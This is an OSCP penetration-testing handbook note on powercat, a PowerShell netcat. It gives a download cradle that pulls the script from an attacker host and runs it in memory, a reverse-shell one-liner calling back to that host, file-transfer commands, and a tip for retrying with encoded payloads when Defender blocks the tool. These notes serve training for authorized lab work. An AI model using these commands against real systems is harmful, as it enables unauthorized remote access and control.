---
title: "powercat"
slug: powercat
category: notes
handbook: oscp
tags: ["shells"]
draft: false
pubDatetime: 2026-08-29T09:33:29+03:00
modDatetime: 2026-09-13T19:42:38+03:00
description: "Netcat written in PowerShell."
---
Netcat written in PowerShell. One `.ps1` file that gives a Windows target reverse shells, listener mode, and file transfer without dropping a binary to disk, loadable entirely in memory through a download cradle. PEN-200 uses it as the PowerShell counterpart to `nc.exe`.

## Install

```bash
sudo apt install powercat
cp /usr/share/powercat/powercat.ps1 .
```

Or straight from the project:

```bash
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
```

The file stays on Kali and is served over HTTP; the target pulls it with a cradle ([Reverse Shells](/collections/oscp/reverse-shells), and the LibreOffice macro case in [LibreOffice Macros](/collections/oscp/libreoffice-macros)). It has to sit in the folder the server exposes. The `powercat` function exists on the target only after that pull executes, so cradle and call are chained with `;` in one line.

## Reverse Shell

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://KALI/powercat.ps1');powercat -c KALI -p 443 -e powershell
```

- `-c` / `-p`: client mode, the Kali address and port to call back to.
- `-e powershell`: run powershell.exe with its stdio wired to the socket; `-e cmd.exe` for cmd.
- Kali catches with plain `nc -lvnp 443`, since powercat's `-e` output is a normal TCP stream. `rlwrap` in front gives line editing.

## Listener Mode and File Transfer

The target can also listen, which is how powercat moves files between two machines:

```powershell
powercat -l -p 443 -of out.txt      # receiver
powercat -c KALI -p 443 -i in.txt   # sender
```

- `-l`: listen for a connection instead of making one.
- `-i` / `-of`: read the stream from a file / write the stream to a file.

## Detection

powercat is old and signatured; current Defender kills it on load. Lab images with stale definitions usually let it through. When both powercat and the hand-rolled TCPClient script fail to call back, the block is on the target side, and the `-enc` blob form in [Reverse Shells](/collections/oscp/reverse-shells) is the next attempt.
